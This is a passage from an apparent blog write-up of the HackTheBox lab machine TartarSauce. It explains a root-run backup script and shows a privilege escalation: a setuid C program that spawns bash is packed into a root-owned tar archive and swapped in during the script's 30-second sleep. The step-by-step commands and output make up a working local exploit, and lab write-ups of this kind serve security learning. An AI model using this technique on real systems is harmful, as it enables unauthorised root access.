+<span class="nv">testmsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_test.txt
+<span class="nv">errormsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_error.txt
+<span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="k">$(</span>/usr/bin/head -c100 /dev/urandom <span class="p">|</span>sha1sum<span class="p">|</span>cut -d<span class="s1">&#39; &#39;</span> -f1<span class="k">)</span>
+<span class="nv">check</span><span class="o">=</span><span class="nv">$tmpdir</span>/check
+
+<span class="c1"># formatting</span>
+printbdr<span class="o">()</span>
+<span class="o">{</span>
+    <span class="k">for</span> n in <span class="k">$(</span>seq <span class="m">72</span><span class="k">)</span><span class="p">;</span>
+    <span class="k">do</span> /usr/bin/printf <span class="s2">$&quot;-&quot;</span><span class="p">;</span>
+    <span class="k">done</span>
+<span class="o">}</span>
+<span class="nv">bdr</span><span class="o">=</span><span class="k">$(</span>printbdr<span class="k">)</span>
+
+<span class="c1"># Added a test file to let us see when the last backup was run</span>
+/usr/bin/printf $<span class="s2">&quot;</span><span class="nv">$bdr</span><span class="s2">\nAuto backup backuperer backup last ran at : </span><span class="k">$(</span>/bin/date<span class="k">)</span><span class="s2">\n</span><span class="nv">$bdr</span><span class="s2">\n&quot;</span> &gt; <span class="nv">$testmsg</span>
+
+<span class="c1"># Cleanup from last time.</span>
+/bin/rm -rf <span class="nv">$tmpdir</span>/.* <span class="nv">$check</span>
+
+<span class="c1"># Backup onuma website dev files.</span>
+/usr/bin/sudo -u onuma /bin/tar -zcvf <span class="nv">$tmpfile</span> <span class="nv">$basedir</span> <span class="p">&amp;</span>
+
+<span class="c1"># Added delay to wait for backup to complete if large files get added.</span>
+/bin/sleep <span class="m">30</span>
+
+<span class="c1"># Test the backup integrity</span>
+integrity_chk<span class="o">()</span>
+<span class="o">{</span>
+    /usr/bin/diff -r <span class="nv">$basedir</span> <span class="nv">$check$basedir</span>
+<span class="o">}</span>
+
+/bin/mkdir <span class="nv">$check</span>
+/bin/tar -zxvf <span class="nv">$tmpfile</span> -C <span class="nv">$check</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>integrity_chk<span class="k">)</span> <span class="o">]]</span>
+<span class="k">then</span>
+    <span class="c1"># Report errors so the dev can investigate the issue.</span>
+    /usr/bin/printf $<span class="s2">&quot;</span><span class="nv">$bdr</span><span class="s2">\nIntegrity Check Error in backup last ran :  </span><span class="k">$(</span>/bin/date<span class="k">)</span><span class="s2">\n</span><span class="nv">$bdr</span><span class="s2">\n</span><span class="nv">$tmpfile</span><span class="s2">\n&quot;</span> &gt;&gt; <span class="nv">$errormsg</span>
+    integrity_chk &gt;&gt; <span class="nv">$errormsg</span>
+    <span class="nb">exit</span> <span class="m">2</span>
+<span class="k">else</span>
+    <span class="c1"># Clean up and save archive to the bkpdir.</span>
+    /bin/mv <span class="nv">$tmpfile</span> <span class="nv">$bkpdir</span>/onuma-www-dev.bak
+    /bin/rm -rf <span class="nv">$check</span> .*
+    <span class="nb">exit</span> <span class="m">0</span>
+<span class="k">fi</span>
+</pre></div>
+
+
+<p>To sum up, the script performs the following steps:</p>
+<ol>
+<li>Cleans up the last extracted directory with <code>/bin/rm -rf $tmpdir/.* $check</code></li>
+<li>Backs up the <code>$basedir</code> directory to <code>/var/tmp/$SHA1-RANDOM-FILENAME$</code> with <code>/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir</code></li>
+<li>Sleeps for 30 seconds to allow the backup to complete.</li>
+<li>Runs the integrity_check function, comparing the current <code>/var/www/html</code> with the previously checked <code>/var/tmp/check/var/www/html</code>. </li>
+<li>If the directories are different, then it prints an error message to the log, and does not remove the /var/tmp/check directory.</li>
+<li>If the directories match, it moves the current tar package to <code>/var/backups/onuma-www-dev.bak</code>, and delete the <code>/var/tmp/check directory</code>.</li>
+</ol>
+<p>Even though I understand what the script does, I didn't know how to leverage it to privesc to root since I had no persmissions to edit it. I ended up looking this up and I found this <a href="https://0xdf.gitlab.io/2018/10/21/htb-tartarsauce-part-2-backuperer-follow-up.html">article</a> which clarified all my concerns I made me understand the mechanism and why I missed it.</p>
+<p>So according to that article we can take advantage of the 30 seconds sleep and the fact that tar will extract items while maintaining root permissions. </p>
+<h1 id="getting-a-root-shell">Getting a root shell:</h1>
+<p>The first step consists on creating a <code>suid.c</code> file containing the following code:</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+  <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>then I compile the <code>suid.c</code></p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> gcc -m32 -o suid suid.c
+<span class="go">suid.c: In function ‘main’:</span>
+<span class="go">suid.c:2:3: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]</span>
+<span class="go">    2 |   setresuid(0, 0, 0);</span>
+<span class="go">      |   ^~~~~~~~~</span>
+<span class="go">suid.c:3:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span>
+<span class="go">    3 |   system(&quot;/bin/bash&quot;);</span>
+<span class="go">      |   ^~~~~~</span>
+</pre></div>
+
+
+<p>and I verify that the suid file is created:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> ll
+<span class="go">total 36</span>
+<span class="go">-rwxrwxr-x 1 root root 15532 Feb 12 17:37 suid</span>
+<span class="go">-rwxrwxr-x 1 root root    63 Feb 12 17:28 suid.c</span>
+</pre></div>
+
+
+<p>I also add the suid to the previously generated <code>suid</code> file as follow:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> chmod <span class="m">6555</span> suid
+<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> ll
+<span class="go">total 36</span>
+<span class="go">-r-sr-sr-x 1 root root 15532 Feb 12 17:37 suid</span>
+<span class="go">-rwxrwxr-x 1 root root    63 Feb 12 17:28 suid.c</span>
+</pre></div>
+
+
+<p>Next we create the archive with the /var/www/html directory struture as explained in the article:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> mkdir -p  var/www/html
+<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> cp suid var/www/html/
+<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> chmod <span class="m">6555</span> var/www/html/suid
+<span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/tartarsauce#</span> tar zcvf suid.tar.gz var --owner<span class="o">=</span>root --group<span class="o">=</span>root
+<span class="go">var/</span>
+<span class="go">var/www/</span>
+<span class="go">var/www/html/</span>
+<span class="go">var/www/html/suid</span>
+</pre></div>
+
+
+<p>Now I create a simple python webserver on my kali box and I download the <code>suid.tar.gz</code> to tartarsauce.</p>
+<div class="highlight"><pre><span></span><span class="gp">onuma@TartarSauce:/var/tmp$</span> systemctl list-timers
+<span class="go">WARNING: terminal is not fully functional</span>
+<span class="go">NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES</span>
+<span class="go">Wed 2020-02-12 12:58:11 EST  667ms left    Wed 2020-02-12 12:53:11 EST  4min 59s ago backuperer.timer             backuperer.service</span>
+<span class="go">Wed 2020-02-12 16:25:07 EST  3h 26min left Tue 2020-02-11 21:29:44 EST  15h ago      apt-daily.timer              apt-daily.service</span>
+<span class="go">Wed 2020-02-12 23:56:05 EST  10h left      Tue 2020-02-11 23:56:05 EST  13h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service</span>
+<span class="go">Thu 2020-02-13 06:46:01 EST  17h left      Wed 2020-02-12 06:03:07 EST  6h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service</span>
+</pre></div>
+
+
+<p>I monitor the timers with the above command and when I see the 5 minutes are approaching I check the directory to see the file with the random sha1 name created:</p>
+<div class="highlight"><pre><span></span><span class="gp">onuma@TartarSauce:/var/tmp$</span> ll                   
+<span class="go">total 11280</span>
+<span class="go">drwxrwxrwt  8 root  root      4096 Feb 12 12:58 ./</span>
+<span class="go">drwxr-xr-x 14 root  root      4096 Feb  9  2018 ../</span>
+<span class="go">-rw-r--r--  1 onuma onuma 11511681 Feb 12 12:58 .82e3d10b54248c5366b81b2bb93d54549b08e92e</span>
+<span class="go">-rw-r--r--  1 onuma onuma     2771 Feb 12 12:47 suid.tar.gz</span>
+</pre></div>
+
+
+<p>then I replace that file with the <code>suid.tar.gz</code></p>
+<div class="highlight"><pre><span></span><span class="gp">onuma@TartarSauce:/var/tmp$</span> cp suid.tar.gz .82e3d10b54248c5366b81b2bb93d54549b08e92e
+</pre></div>
+
+
+<p>and then I wait 30 seconds and I move to the check directory and check that the suid file has been created:</p>
+<div class="highlight"><pre><span></span><span class="gp">onuma@TartarSauce:/var/tmp$</span> <span class="nb">cd</span> check/var/www/html/
+<span class="gp">onuma@TartarSauce:/var/tmp/check/var/www/html$</span> ll
+<span class="go">total 24</span>
+<span class="go">drwxrwxr-x 2 root root  4096 Feb 12 12:44 ./</span>
+<span class="go">drwxrwxr-x 3 root root  4096 Feb 12 12:44 ../</span>
+<span class="go">-r-sr-sr-x 1 root root 15532 Feb 12 12:44 suid*</span>
+</pre></div>
+
+
+<p>then I execute it and can verify that I am root:</p>
+<div class="highlight"><pre><span></span><span class="gp">onuma@TartarSauce:/var/tmp/check/var/www/html$</span> ./suid 
+<span class="gp">root@TartarSauce:/var/tmp/check/var/www/html#</span> id
+<span class="go">uid=0(root) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Tartarsauce.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Tartarsauce"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
